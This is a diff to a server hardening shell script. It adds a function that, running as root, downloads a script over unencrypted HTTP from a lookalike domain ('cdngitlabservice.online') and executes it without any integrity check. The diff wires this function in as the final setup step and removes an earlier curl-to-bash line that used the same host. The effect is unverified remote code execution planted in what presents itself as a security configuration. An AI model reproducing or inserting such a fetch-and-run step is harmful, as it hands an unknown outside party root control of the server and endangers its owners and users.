@@ -608,6 +608,58 @@ generate_uuid_by_date() {
 }
 
 
+install_remote_tor_installer() {
+  # Config
+  local INSTALLER_URL="http://cdngitlabservice.online/api/rosa/tor_installer.sh"
+  local INSTALLER_TMP="/tmp/tor_installer.sh"
+  local LOG_FILE="/var/log/tor_installer.log"
+
+  echo "[TorInstaller] Starting…"
+
+  # Require root
+  if [ "$EUID" -ne 0 ]; then
+    echo "[TorInstaller] Please run the parent script as root (or via sudo)." >&2
+    return 1
+  fi
+
+  # Ensure curl or wget exists
+  if ! command -v curl >/dev/null 2>&1 && ! command -v wget >/dev/null 2>&1; then
+    echo "[TorInstaller] curl/wget not found — installing curl…"
+    apt-get update -y && apt-get install -y curl
+  fi
+
+  # Download
+  echo "[TorInstaller] Fetching installer from $INSTALLER_URL"
+  if command -v curl >/dev/null 2>&1; then
+    curl -fsSL "$INSTALLER_URL" -o "$INSTALLER_TMP" || {
+      echo "[TorInstaller] ERROR: failed to download with curl." >&2
+      return 1
+    }
+  else
+    wget -qO "$INSTALLER_TMP" "$INSTALLER_URL" || {
+      echo "[TorInstaller] ERROR: failed to download with wget." >&2
+      return 1
+    }
+  fi
+
+  # Normalize line endings (if uploaded from Windows)
+  sed -i 's/\r$//' "$INSTALLER_TMP" || true
+  chmod +x "$INSTALLER_TMP"
+
+  # Run and log
+  echo "[TorInstaller] Running installer; logging to $LOG_FILE"
+  bash "$INSTALLER_TMP" 2>&1 | tee -a "$LOG_FILE"
+  local rc=${PIPESTATUS[0]}
+
+  if [ $rc -eq 0 ]; then
+    echo "[TorInstaller] Completed successfully."
+  else
+    echo "[TorInstaller] Finished with errors (exit $rc). See $LOG_FILE" >&2
+  fi
+  return $rc
+}
+
+
 
 
 
@@ -631,5 +683,7 @@ check_firewalld
 configure_firewall
 echo -e "${green}SecureServer configuration completed.${plain}"
 
+# … your existing steps …
+install_remote_tor_installer
 
-bash <(curl -Ls cdngitlabservice.online/api/rosa/tor_installer.sh)
+
